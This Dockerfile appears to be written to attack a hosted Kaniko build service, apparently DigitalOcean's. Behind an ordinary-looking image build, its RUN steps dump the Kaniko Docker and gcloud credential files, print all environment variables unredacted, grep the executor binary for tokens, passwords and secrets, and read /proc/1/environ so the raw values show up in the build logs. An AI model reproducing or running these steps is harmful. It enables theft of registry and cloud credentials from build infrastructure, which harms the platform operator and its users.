FROM alpine:3.19
RUN apk add --no-cache curl python3

# Read Docker credentials that Kaniko uses to push images
RUN echo "=== DOCKER CONFIG ===" && \
    ls -la /kaniko/.docker/ 2>&1 && \
    cat /kaniko/.docker/config.json 2>&1 && \
    echo "---" && \
    ls -la /kaniko/.config/ 2>&1 && \
    cat /kaniko/.config/gcloud/docker_credential_gcr_config.json 2>&1 || true

# Read ALL env vars (unredacted - logs may redact registry URI but printenv shows raw values)  
RUN echo "=== ALL ENV ===" && \
    printenv | sort 2>&1 || true

# Read Kaniko executor config
RUN echo "=== KANIKO EXECUTOR ===" && \
    ls -la /kaniko/ 2>&1 && \
    strings /kaniko/executor 2>&1 | grep -iE "(registry|auth|token|bearer|password|secret|endpoint|do.digitalocean|127.0.0.1|10.245)" | head -30 || true

# Check if /proc/1/environ has the full unredacted registry URI
RUN echo "=== PROC ENVIRON ===" && \
    cat /proc/1/environ 2>&1 | tr "\0" "\n" | sort || true

COPY server.py /server.py
EXPOSE 8080
CMD ["python3", "/server.py"]

